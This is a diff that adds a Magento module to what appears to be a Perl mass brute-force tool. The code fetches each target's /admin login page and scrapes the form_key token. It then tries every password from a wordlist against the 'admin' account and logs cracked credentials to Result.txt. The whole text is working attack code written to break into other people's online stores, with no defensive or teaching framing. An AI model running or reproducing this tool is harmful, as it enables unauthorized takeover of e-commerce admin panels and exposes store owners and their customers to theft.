@@ -407,3 +407,57 @@ next OUTER;
 }
 }
 }
+
+###### Magento #######
+sub magento{
+$magsite = $site . '/admin';
+
+$ua = LWP::UserAgent->new(keep_alive => 1);
+$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
+$ua->timeout (30);
+$ua->cookie_jar(
+        HTTP::Cookies->new(
+            file => 'mycookies.txt',
+            autosave => 1
+        )
+    );
+    
+$getoken = $ua->get($magsite)->content;
+if ( $getoken =~ /type="hidden" value="(.*)"/ ) {
+$token = $1 ;
+}else{
+print color('bold red'),"\n [";
+print color('bold green'),"x";
+print color('bold red'),"] ";
+print color('bold white'),"Can't Grabb Magento Token !\n";
+next OUTER;
+}
+
+print color('bold red'),"\n [";
+print color('bold green'),"-";
+print color('bold red'),"] ";
+print color('bold white'),"Starting brute force\n";
+open(a,"<$pass") or die "$!";
+while(<a>){
+chomp($_);
+$maguser = "admin";
+$magpass = $_;
+print color('bold red'),"\n [";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Trying: $magpass ";
+
+$magbrute = POST $magsite, ["form_key" => "$token", "login[username]" => "$maguser", "dummy" => "", "login[password]" => "$magpass"];
+$response = $ua->request($magbrute);
+my $pwnd = $ua->get("$magsite")->content;
+if ($pwnd =~ /logout/){
+print color('bold white'),"- ";
+print color('bold green'),"FOUND\n";
+print color('reset');
+open (TEXT, '>>Result.txt');
+print TEXT "$magsite => User: $maguser Pass: $magpass\n";
+close (TEXT);
+next OUTER;
+}
+}
+}
